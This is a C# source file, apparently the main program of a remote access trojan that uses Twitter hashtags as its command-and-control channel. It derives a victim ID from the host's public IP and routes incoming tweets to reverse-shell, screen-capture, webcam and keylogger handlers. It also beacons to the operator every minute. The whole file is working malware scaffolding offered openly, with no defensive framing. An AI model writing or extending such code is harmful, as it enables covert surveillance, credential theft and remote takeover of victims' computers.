using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using TwitterCommandAndControl.Core;
using TwitterCommandAndControl.Handlers;

namespace TwitterCommandAndControl.Test
{
    class Program
    {
        static void Main(string[] args)
        {
            var uniqueID = Convert.ToBase64String(SHA256Managed.Create().ComputeHash(ASCIIEncoding.UTF8.GetBytes(GetPublicIP.GetIP())));
            var hashTag = "#TwitterCommandAndControl";

            Console.WriteLine("Starting Tracker");

            var tracker = Tracker.New(x => {
                Console.WriteLine(x);
                Task.Run(() =>
                {
                    ReverseShellHandler.Respond(x);
                    ScreenCaptureHandler.Respond(x);
                    WebcamHandler.Respond(x);
                    KeyLoggerHandler.Respond(x);
                });
            }, 
            track: hashTag + ",#" + uniqueID, 
            log: Console.Out);
            
            while (!tracker.IsActive) ;
            Console.WriteLine("Tracker Active");

            Console.WriteLine("Signaling");

            Task.Run(() =>
            {
                while (tracker.IsActive)
                {
                    Messenger.Send(hashTag + " #unique=" + uniqueID);
                    Thread.Sleep(60000);
                }
            }).Wait();

            //tracker.Wait();
        }
    }
}
